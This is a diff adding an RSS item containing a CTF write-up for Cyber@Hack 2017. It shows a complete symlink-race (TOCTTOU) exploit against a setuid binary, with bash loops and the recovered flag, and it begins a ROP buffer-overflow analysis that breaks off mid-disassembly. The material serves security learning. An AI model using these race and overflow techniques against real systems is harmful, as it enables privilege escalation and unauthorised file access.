@@ -7,6 +7,619 @@
 		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>[Write-Up] Cyber@Hack</title>
+				<description>&lt;h1 id=&quot;surroundings&quot;&gt;Surroundings&lt;/h1&gt;
+&lt;p&gt;The &lt;a href=&quot;https://www.cyberathack.com/&quot;&gt;Cyber@Hack&lt;/a&gt; is a french CTF “on site” who take place in differents french cities. The CTF lasted a whole night from the 22 september to the 23 september. The CTF is made of different categories like pwnable, reverse engineering, web, cryptographie, steganographie and forensic.&lt;/p&gt;
+
+&lt;p&gt;I did it with a friend and we finished 14th!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/cyberathack.png&quot; alt=&quot;cyber@hack&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Together we’ve done 6 challenges. We were focused on exploit and reverse engineering challenges. This post will explain you how we’ve solved the different challenges. Below is the different challenges we solved:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;/write-up/2017/09/26/cyber@hack.html#1-tocttou&quot;&gt;tocttou&lt;/a&gt; (Exploit)&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;/write-up/2017/09/26/cyber@hack.html#2-basicrop&quot;&gt;basicrop&lt;/a&gt; (Exploit)&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;/write-up/2017/09/26/cyber@hack.html#3-alien-language&quot;&gt;alien-language&lt;/a&gt; (Reverse engineering/Cryptography)&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;/write-up/2017/09/26/cyber@hack.html#4-botoxedstring&quot;&gt;BotoxedString&lt;/a&gt; (Reverse engineering)&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;/write-up/2017/09/26/cyber@hack.html#5-robot-cop&quot;&gt;Robot cOP&lt;/a&gt; (Exploit)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;You can find all the binary/exploit present in this post on my &lt;a href=&quot;https://github.com/meffre-q/ctf/tree/master/cyber%40hack_2k17&quot;&gt;Github&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;1-tocttou&quot;&gt;1. Tocttou&lt;/h1&gt;
+&lt;p&gt;This challenge was solved by my friend. It’s a tocttou exploitation challenge. Tocttou means Time Of Check To Time Of Use, that bug occurs when a binary open a file, try to access it and if it can, read it contents but forgot to check if the file has changed between the access part and the read part.&lt;/p&gt;
+
+&lt;p&gt;So we first begun by checking the binary.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file tocttou
+tocttou: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.32, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;f85ccc503bad6c160864d080481d6d9885d1dd65, not stripped
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lh&lt;/span&gt; tocttou 
+&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 tocttou-solved tocttou 8.3K Sep 21 14:03 tocttou
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;checksec &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; tocttou
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
+No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		4	tocttou
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We faced a basic binary without stripped, PIE or SSP. Then I try to start the binary to check how it works:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./tocttou
+USAGE : ./tocttou &amp;lt;file to &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./tocttou flag
+flag : you dont have enough permissions to &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;this file.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hum… It would have been so easy! Lets begin the reverse engineering part! After a little look at the asm code, it seems that the important part is in the “can_be_read” function.&lt;/p&gt;
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tocttou&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;Reading&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tocttou&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;no&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;debugging&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)...&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;peda&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disas&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;can_be_read&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;Dump&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;assembler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;can_be_read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400770&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400771&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400774&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400778&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x000000000040077c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400781&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;jne&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x40078a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;can_be_read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400783&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400788&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;jmp&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x4007ab&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;can_be_read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x000000000040078a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x000000000040078e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400793&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400796&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x4005d0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;access&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x000000000040079b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;test&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x000000000040079d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;jne&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x4007a6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;can_be_read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x000000000040079f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x00000000004007a4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;jmp&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x4007ab&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;can_be_read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x00000000004007a6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x00000000004007ab&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;leave&lt;/span&gt;  
+   &lt;span class=&quot;mh&quot;&gt;0x00000000004007ac&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;ret&lt;/span&gt;    
+&lt;span class=&quot;n&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;assembler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The function call the access libc function and return 1 if the access has success or 0 if not. Here is the Tocttou bug. As I said previously, if we change the file after access checked success, we will be able to bypass the access function!&lt;/p&gt;
+
+&lt;p&gt;To do it, we will begin by create a file in the tmp directory.This file will be used for the first symbolic link. My friend solved the challenge in python but I’m better in Bash so I will show you the Bash method. To solved the challenge, we will need 2 shell. The first one will do an infine look with 4 command. The two first will create a symlink with the previous created file and then deleted this link and the two next command will created a symlink between with the flag file and then deleted this symlink. The second shell will run the binary in an infinite loop with the symlink as argument. The goal is to set the symlink when access check the file and then change that symlink when the file will be read with the flag file. You can see below a little scheme about the attack:&lt;img src=&quot;/assets/media/tocttou_schema.png&quot; alt=&quot;tocttou scheme&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now let’s try it! Below is the first shell view:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;touch /tmp/dagger/foo
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;ln &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /tmp/dagger/foo /tmp/dagger/toc&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; unlink /tmp/dagger/toc&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ln &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /challenges/tocttou/flag /tmp/dagger/toc&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; unlink /tmp/dagger/toc&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And now the second shell view:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; ./tocttou/tocttou /tmp/dagger/toc|grep flag &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
+&lt;/span&gt;flag&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;tick_tock_touuuu&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Done.&lt;/p&gt;
+
+&lt;p&gt;Well played to my friend!&lt;/p&gt;
+
+&lt;h1 id=&quot;2-basicrop&quot;&gt;2. BasicROP&lt;/h1&gt;
+&lt;p&gt;As it is sayed in the challenge name, this one is a very basic Return Oriented Programming. For thos who don’t know what is the ROP technique, I redirect you to one of my precedent &lt;a href=&quot;http://quentinmeffre.fr/return-oriented-programming-1/&quot;&gt;post&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;I first begin by taking a look to the binary, the size, the protection, the type, etc…&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file basicrop 
+basicrop: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, statically linked, not stripped
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lh&lt;/span&gt; basicrop 
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 meffre_q meffre_q 1.1K Sep 21 17:43 basicrop
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;checksec &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; basicrop
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
+No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		0	basicrop
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nm basicrop 
+00000000004000c1 t breakme
+000000000060011c D __bss_start
+000000000060011c D _edata
+0000000000600120 D _end
+00000000004000fa t fuckit
+0000000000600114 d shell
+00000000004000b0 T _start
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;No special protection, the binary is statically compiled but it seems very small, only 1.1K and after checking the symbol, the binary seems to be developed directly in assembly language because of the little number of symbols.&lt;/p&gt;
+
+&lt;p&gt;So I begun the reversing part but it was very fast because of the little size of the binary. The “_start” function call a function name “breakme”. This “breakme” function did two syscall, the first one is “read” and the second one is “write”. But there is an overflow at the “read” syscall because the binary try to read 280 bytes in a 256 bytes buffer. So we can overwrite RIP register at the 256th byte. A basic ROP should not be easy because of the binary size but I remember of 2 symbols I didn’t saw yet in the binary, the function “fuckit” and the data “shell”. Below is the disassembled code of fuckit:&lt;/p&gt;
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;peda&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disas&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fuckit&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;Dump&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;assembler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fuckit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x00000000004000fa&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;movabs&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x600114&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400104&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400106&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400107&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt;
